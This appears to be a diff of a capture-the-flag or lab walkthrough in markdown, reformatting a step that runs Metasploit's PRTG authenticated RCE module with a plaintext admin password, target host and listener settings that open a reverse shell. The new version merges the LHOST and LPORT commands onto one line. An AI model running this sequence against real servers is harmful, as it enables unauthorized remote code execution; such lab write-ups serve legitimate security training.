@@ -58,10 +58,11 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 >	![](docs/searchsploit.png)
 
 9.	using metasploit 
->	`use exploit/windows/http/prtg_authenticated_rce`
->>	`set admin_password PrTg@dmin2019`
->>>	`set RHOST $IP`
->>>>	`set LHOST tun0`
->>>>>	`set LPORT 9001`
->>>>>>	run
+```
+use exploit/windows/http/prtg_authenticated_rce
+set admin_password PrTg@dmin2019
+set RHOST $IP
+set LHOST tun0	set LPORT 9001
+run
+```
 >	![](docs/rce.png)
